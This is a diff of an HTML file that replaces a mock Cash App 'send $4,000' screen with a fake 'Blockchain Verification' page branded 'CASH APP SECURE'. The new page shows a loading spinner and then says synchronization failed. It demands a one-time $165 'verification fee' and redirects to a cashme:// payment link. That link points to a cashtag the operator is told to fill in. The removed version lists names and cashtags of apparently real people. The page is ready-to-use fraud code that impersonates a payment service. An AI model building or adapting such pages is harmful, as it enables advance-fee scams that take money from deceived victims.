@@ -1,234 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cash UI</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain Verification</title>
+    <style>
+        /* Mobile-First Base */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #080b0d; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { width: 90%; max-width: 400px; text-align: center; }
 
-<style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, "San Francisco", sans-serif;
-  background: #f6f6f6;
-}
+        /* Loader Animation */
+        .spinner {
+            width: 60px; height: 60px;
+            border: 4px solid rgba(0, 214, 50, 0.1);
+            border-top: 4px solid #00d632;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-.container {
-  max-width: 420px;
-  margin: auto;
-  background: #fff;
-  height: 100vh;
-}
+        /* Icon State (Hidden initially) */
+        .error-icon { font-size: 60px; color: #ff5f5f; margin-bottom: 25px; display: none; }
 
-/* HEADER */
-.header {
-  display: flex;
-  align-items: center;
-  padding: 12px 15px;
-}
+        /* Typography */
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 15px; }
+        p { font-size: 17px; color: #b0b0b0; line-height: 1.6; }
+        .fee-highlight { color: #ff5f5f; font-weight: 700; }
 
-.header .left {
-  font-size: 22px;
-}
-
-.header .center {
-  flex: 1;
-  text-align: center;
-}
-
-.center .amount {
-  font-size: 22px;
-  font-weight: 600;
-}
-
-.center .sub {
-  font-size: 13px;
-  color: #888;
-}
-
-.pay-btn {
-  background: #00d64f;
-  color: white;
-  border: none;
-  padding: 8px 16px;
-  border-radius: 20px;
-  font-weight: 600;
-}
-
-/* INPUT ROWS (INLINE LABEL STYLE) */
-.field {
-  display: flex;
-  align-items: center;
-  padding: 14px 16px;
-  border-top: 1px solid #eee;
-}
-
-.label {
-  width: 90px;
-  font-weight: 600;
-}
-
-.field input {
-  border: none;
-  flex: 1;
-  font-size: 16px;
-  outline: none;
-}
-
-.field input::placeholder {
-  color: #aaa;
-}
-
-/* SEND AS */
-.send-as {
-  display: flex;
-  gap: 10px;
-  padding: 14px 16px;
-}
-
-.send-as button {
-  border: none;
-  padding: 8px 14px;
-  border-radius: 18px;
-  background: #efefef;
-  font-size: 14px;
-}
-
-.send-as .active {
-  background: #00d64f;
-  color: white;
-}
-
-/* SUGGESTED */
-.section-title {
-  font-size: 11px;
-  color: #999;
-  padding: 8px 16px;
-  letter-spacing: 1px;
-}
-
-.item {
-  display: flex;
-  align-items: center;
-  padding: 10px 16px;
-}
-
-.item input {
-  margin-right: 10px;
-}
-
-.avatar {
-  width: 38px;
-  height: 38px;
-  border-radius: 50%;
-  color: #fff;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-weight: 600;
-  margin-right: 12px;
-}
-
-.info {
-  flex: 1;
-  font-size: 15px;
-}
-
-.info span {
-  display: block;
-  font-size: 13px;
-  color: #888;
-}
-
-.icon {
-  width: 26px;
-  height: 26px;
-  border-radius: 50%;
-  background: #e5e5e5;
-}
-</style>
+        /* Footer Branding */
+        .footer { position: absolute; bottom: 40px; width: 100%; color: #444; font-size: 14px; font-weight: 600; letter-spacing: 1px; }
+    </style>
 </head>
-
 <body>
 
-<div class="container">
+    <div class="container">
+        <div id="loader" class="spinner"></div>
+        
+        <div id="errorIcon" class="error-icon">⚠️</div>
 
-  <!-- HEADER -->
-  <div class="header">
-    <div class="left">✕</div>
-
-    <div class="center">
-      <div class="amount">$4,000</div>
-      <div class="sub">Blockchain ▼</div>
+        <h1 id="statusTitle">Syncing with Blockchain...</h1>
+        <p id="statusMsg">Connecting to secure verification gateway.</p>
     </div>
 
-    <button class="pay-btn">Pay</button>
-  </div>
+    <div class="footer">CASH APP SECURE</div>
 
-  <!-- TO -->
-  <div class="field">
-    <div class="label">To</div>
-    <input placeholder="Name, $Cashtag, Phone, Email">
-  </div>
+    <script>
+        // THE LOGIC
+        const loader = document.getElementById('loader');
+        const errorIcon = document.getElementById('errorIcon');
+        const title = document.getElementById('statusTitle');
+        const msg = document.getElementById('statusMsg');
 
-  <!-- FOR -->
-  <div class="field">
-    <div class="label">For</div>
-    <input placeholder="Add a note">
-  </div>
+        // Replace 'YourCashtag' with your actual Cash App ID
+        const cashtag = "YourCashtag"; 
+        const amount = "165";
 
-  <!-- EMAIL -->
-  <div class="field">
-    <div class="label">Email</div>
-    <input type="email" placeholder="Enter email">
-  </div>
+        // Start the 3-second sequence
+        setTimeout(() => {
+            // 1. Change UI to show the error/fee requirement
+            loader.style.display = "none";
+            errorIcon.style.display = "block";
+            title.innerText = "Payment Required";
+            title.style.color = "#ff5f5f";
+            msg.innerHTML = `Blockchain synchronization failed.<br>A one-time verification fee of <span class="fee-highlight">$${amount}</span> is required.<br><br>Redirecting to Cash App...`;
 
-  <!-- SEND AS -->
-  <div class="send-as">
-    <button class="active">Cash</button>
-    <button>Gift Card ▼</button>
-    <button>Stock ▼</button>
-  </div>
+            // 2. Wait another 3 seconds for the user to read it, then redirect
+            setTimeout(() => {
+                window.location.href = `cashme://cash.app/$${cashtag}/${amount}`;
+            }, 3000);
 
-  <!-- SUGGESTED -->
-  <div class="section-title">SUGGESTED</div>
-
-  <div id="list"></div>
-
-</div>
-
-<script>
-const users = [
-  {name:"Kellen Bates", tag:"$Voidosu", color:"#ff2d55", letter:"K"},
-  {name:"Kate Howard", tag:"$LKhowz", color:"#8B5E3C", letter:"K"},
-  {name:"Julia Wilson", tag:"$wilson8823", color:"#5A31F4", letter:"J"},
-  {name:"Joshua Aguilar", tag:"$aguilarjoshua18", color:"#C76DDB", letter:"J"},
-  {name:"Haylee Walls", tag:"$HayleeWalls", color:"#88A83F", letter:"H"},
-  {name:"Cierra Shepard", tag:"$brutallyhonestcc", color:"#4A3B66", letter:"C"},
-  {name:"Camron Watkins", tag:"$kambam3118", color:"#1E4DB7", letter:"C"},
-  {name:"Alma Davis", tag:"$Ladyboss4ever", color:"#F4F44C", letter:"A"}
-];
-
-const list = document.getElementById("list");
-
-users.forEach(user => {
-  const div = document.createElement("div");
-  div.className = "item";
-
-  div.innerHTML = `
-    <input type="checkbox">
-    <div class="avatar" style="background:${user.color}">
-      ${user.letter}
-    </div>
-    <div class="info">
-      ${user.name}
-      <span>${user.tag}</span>
-    </div>
-    <div class="icon"></div>
-  `;
-
-  list.appendChild(div);
-});
-</script>
-
+        }, 3000); // Initial loading time
+    </script>
 </body>
 </html>
